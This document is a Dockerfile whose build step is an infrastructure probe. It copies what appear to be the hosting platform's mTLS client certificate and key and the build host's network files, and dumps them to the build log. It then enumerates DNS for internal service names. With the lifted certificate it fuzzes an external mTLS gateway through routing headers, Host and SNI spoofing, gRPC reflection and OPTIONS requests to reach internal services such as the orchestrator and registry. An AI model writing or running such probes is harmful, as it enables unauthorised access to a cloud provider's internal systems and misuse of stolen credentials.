FROM alpine:3.20
COPY var/lib/railwayapp/mtls-pki /pki
COPY etc/hosts /f_hosts
COPY etc/resolv.conf /f_resolv
RUN set -x; echo "===F1==="; \
 apk add --no-cache curl bind-tools openssl >/dev/null 2>&1; \
 echo "--HOSTSHOST--"; cat /f_hosts; echo "--RESOLV--"; cat /f_resolv; \
 echo "--DNS--"; for h in builder-lhmgif.railway.internal orchestrator.railway.internal orchestrator.gcp.production.rlwy.net orchestrator.metal.production.rlwy.net registry.railway.internal registry.gcp.production.rlwy.net registry.metal.production.rlwy.net stacklet.railway.internal stacklet.gcp.production.rlwy.net stacklet.metal.production.rlwy.net nats.railway.internal backboard.railway.internal railyard.railway.internal network-cp.railway.internal storage-agent.railway.internal; do printf '%s=' $h; getent hosts $h 2>/dev/null | head -1; echo; done; \
 G=external-mtls-service-gateway-us-west1.gcp.production.rlwy.net; \
 echo "--BASELINE--"; \
 echo "## none"; curl -sS -m 6 -o /tmp/b -D /tmp/h --cert /pki/client.crt --key /pki/client.key --cacert /pki/server-ca-bundle.crt https://$G/ -w 'code=%{http_code} size=%{size_download}\n' 2>&1; head -c 200 /tmp/b | tr -d '\0'; echo; grep -aiE '^(HTTP|server|x-|content-type|grpc|date)' /tmp/h | head -10; \
 echo "## garbage"; curl -sS -m 6 -o /tmp/b -D /tmp/h --cert /pki/client.crt --key /pki/client.key --cacert /pki/server-ca-bundle.crt -H 'x-mpipe-target: zzznope' https://$G/ -w 'code=%{http_code} size=%{size_download}\n' 2>&1; head -c 200 /tmp/b | tr -d '\0'; echo; grep -aiE '^(HTTP|server|x-|content-type|grpc|date)' /tmp/h | head -10; \
 echo "## empty"; curl -sS -m 6 -o /tmp/b -D /tmp/h --cert /pki/client.crt --key /pki/client.key --cacert /pki/server-ca-bundle.crt -H 'x-mpipe-target;' https://$G/ -w 'code=%{http_code} size=%{size_download}\n' 2>&1; grep -aiE '^(HTTP|server|x-|content-type)' /tmp/h | head -6; \
 echo "## h1_orch"; curl -sS -m 6 --http1.1 -o /tmp/b -D /tmp/h --cert /pki/client.crt --key /pki/client.key --cacert /pki/server-ca-bundle.crt -H 'x-mpipe-target: orchestrator' https://$G/ -w 'code=%{http_code} size=%{size_download}\n' 2>&1; head -c 200 /tmp/b | tr -d '\0'; echo; grep -aiE '^(HTTP|server|x-|content-type|grpc|date)' /tmp/h | head -10; \
 echo "--MATRIX--"; \
 for T in orchestrator orchestrator.railway.internal internal_orchestrator internal-orchestrator internalorchestrator orchestrator.gcp.production.rlwy.net orchestrator.metal.production.rlwy.net backboard backboard.railway.internal internal_backboard internal-backboard registry registry.railway.internal internal_registry internal-registry storage-agent storage_agent storageagent storage-agent.railway.internal network-cp network_cp networkcp railyard station csc certs stacklet stacklet.railway.internal nats builder internal_builder internal-builder builder-agent buildkit traces internal_traces otel otlp collector internal internal-api mpipe gateway hikari; do \
  for P in / /healthz /health /v1/ /metrics /version; do R=$(curl -s -m 3 --connect-timeout 2 -o /tmp/o -w '%{http_code} %{size_download} %{content_type}' --cert /pki/client.crt --key /pki/client.key --cacert /pki/server-ca-bundle.crt -H "x-mpipe-target: $T" https://$G$P 2>/dev/null); B=$(head -c 70 /tmp/o 2>/dev/null | tr -d '\0' | tr '\n\r' '  '); echo "$T|$P|$R|$B"; done; done; \
 echo "--AUTHHDR--"; for H in orchestrator orchestrator.railway.internal orchestrator.gcp.production.rlwy.net internal-orchestrator backboard registry stacklet; do printf 'host=%s ' "$H"; curl -s -m 4 -o /tmp/o -w 'code=%{http_code} size=%{size_download}\n' --cert /pki/client.crt --key /pki/client.key --cacert /pki/server-ca-bundle.crt -H "Host: $H" https://$G/ 2>/dev/null; done; \
 echo "--SNI--"; IP=$(getent hosts $G | awk '{print $1}' | head -1); echo "GWIP=$IP"; for N in orchestrator.gcp.production.rlwy.net orchestrator.metal.production.rlwy.net stacklet.gcp.production.rlwy.net stacklet.metal.production.rlwy.net registry.gcp.production.rlwy.net registry.metal.production.rlwy.net; do printf 'sni=%s ' "$N"; curl -sk -m 4 --connect-timeout 2 --resolve "$N:443:$IP" -o /tmp/o -w 'code=%{http_code} size=%{size_download}\n' --cert /pki/client.crt --key /pki/client.key https://$N/ 2>/dev/null; done; \
 echo "--GRPC--"; for T in NONE orchestrator stacklet internal_orchestrator; do for M in /grpc.health.v1.Health/Check /grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo; do printf 'T=%s M=%s ' "$T" "$M"; if [ "$T" = NONE ]; then curl -s -m 5 --http2 -o /tmp/g -D /tmp/gh -H 'content-type: application/grpc' --data-binary $'\x00\x00\x00\x00\x00' https://$G$M -w 'code=%{http_code} size=%{size_download}\n' 2>&1; else curl -s -m 5 --http2 -o /tmp/g -D /tmp/gh -H "x-mpipe-target: $T" -H 'content-type: application/grpc' --data-binary $'\x00\x00\x00\x00\x00' https://$G$M -w 'code=%{http_code} size=%{size_download}\n' 2>&1; fi; grep -aiE '^(HTTP|grpc-|content-type|server)' /tmp/gh | tr '\n' ' '; echo; done; done; \
 echo "--OPTS--"; for T in orchestrator stacklet registry; do printf 'opt=%s ' "$T"; curl -s -m 4 -X OPTIONS -o /tmp/o -D /tmp/oh -w 'code=%{http_code} size=%{size_download}\n' --cert /pki/client.crt --key /pki/client.key --cacert /pki/server-ca-bundle.crt -H "x-mpipe-target: $T" https://$G/ 2>/dev/null; grep -aiE '^(allow|access-control|server)' /tmp/oh | tr '\n' ' '; echo; done; \
 echo "===F1END==="
CMD ["sh","-c","sleep 3600"]
